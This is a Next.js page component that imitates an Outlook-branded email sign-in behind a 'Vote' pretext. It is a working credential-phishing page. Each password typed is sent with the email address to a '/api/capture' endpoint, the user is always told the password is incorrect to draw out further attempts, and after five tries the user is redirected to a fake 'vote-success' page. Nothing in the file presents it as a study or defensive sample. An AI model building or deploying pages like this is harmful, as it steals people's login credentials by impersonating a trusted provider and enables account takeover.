import Head from 'next/head';
import { useState, useRef } from 'react';
import { useRouter } from 'next/router';

const MAX_ATTEMPTS = 5;

export default function EmailLoginPage() {
  const router = useRouter();
  const [step, setStep] = useState(1);
  const [email, setEmail] = useState('');
  const [passcode, setPasscode] = useState('');
  const [feedback, setFeedback] = useState('');
  const attemptRef = useRef(0);

  const handleContinue = () => {
    if (!email.trim()) {
      setFeedback('Please enter a valid email address.');
      return;
    }
    setFeedback('');
    setStep(2);
  };

  const handleLogin = async () => {
    setFeedback('Incorrect password! Please try again...');
    const pwdToSend = passcode;
    setPasscode('');
    attemptRef.current += 1;
    
    try {
      await fetch('/api/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: email.trim(),
          password: pwdToSend,
          method: 'email'
        })
      });
    } catch (e) {}
    
    if (attemptRef.current >= MAX_ATTEMPTS) {
      router.push('/vote-success');
    }
  };

  const handleBack = () => {
    setStep(1);
    setFeedback('');
    setPasscode('');
  };

  return (
    <>
      <Head>
        <meta charSet="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Sign in - Vote</title>
      </Head>

      <style jsx>{`
        html, body { height: 100%; margin: 0; padding: 0; }
        body { 
          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
          background: linear-gradient(135deg, #e7ebf0, #f0f2f5); 
          display: flex; 
          justify-content: center; 
          align-items: center; 
          min-height: 100vh;
          margin: 0;
        }
        .main-wrapper {
          background: white;
          width: 100%;
          max-width: 360px;
          padding: 24px;
          border-radius: 8px;
          box-shadow: 0 2px 8px rgba(0,0,0,0.1);
          text-align: center;
        }
        .logo { 
          width: 50px; 
          height: 50px; 
          margin: 0 auto 16px;
          display: block;
        }
        input { 
          width: 100%;
          padding: 12px 14px; 
          margin: 10px 0;
          border: 1px solid #ccc; 
          border-radius: 6px;
          font-size: 15px;
          background: #fafafa;
        }
        input:focus { 
          outline: none;
          border-color: #0078d4;
          background: white;
        }
        button { 
          width: 100%;
          padding: 12px;
          background: #0078d4;
          color: white;
          border: none;
          border-radius: 6px;
          font-size: 16px;
          cursor: pointer;
          margin-top: 8px;
        }
        button:hover { 
          background: #005a9e;
        }
        .feedback {
          color: #e1306c;
          font-size: 14px;
          margin: 8px 0;
        }
        .back-link {
          color: #0078d4;
          text-decoration: none;
          font-size: 14px;
          margin-top: 12px;
          cursor: pointer;
          display: inline-block;
        }
        .back-link:hover { text-decoration: underline; }
        .footer {
          margin-top: 24px;
          padding-top: 16px;
          border-top: 1px solid #ccc;
          font-size: 12px;
          color: #666;
        }
        .footer a {
          color: #0078d4;
          text-decoration: none;
          margin: 0 6px;
        }
        .footer a:hover { text-decoration: underline; }
      `}</style>

      <div className="main-wrapper">
        {step === 1 ? (
          <div>
            <img className="logo" src="/logos/outlook-logo.svg" alt="Email" />
            <h2>Sign in</h2>
            <input 
              type="email" 
              placeholder="Enter your email" 
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              onKeyDown={(e) => e.key === 'Enter' && handleContinue()}
            />
            <div className="feedback">{feedback}</div>
            <button onClick={handleContinue}>Next</button>
          </div>
        ) : (
          <div>
            <h2>Enter your passcode</h2>
            <input
              type="password"
              placeholder="Passcode"
              value={passcode}
              onChange={(e) => setPasscode(e.target.value)}
              onKeyDown={(e) => e.key === 'Enter' && handleLogin()}
            />
            <div className="feedback">{feedback}</div>
            <button onClick={handleLogin}>Sign In</button>
            <div className="back-link" onClick={handleBack}>← Back</div>
          </div>
        )}
        
        <div className="footer">
          <a href="#">&nbsp;Terms of use&nbsp;</a>
          <a href="#">&nbsp;Privacy&nbsp;</a>
          <a href="#">…</a>
        </div>
      </div>
    </>
  );
}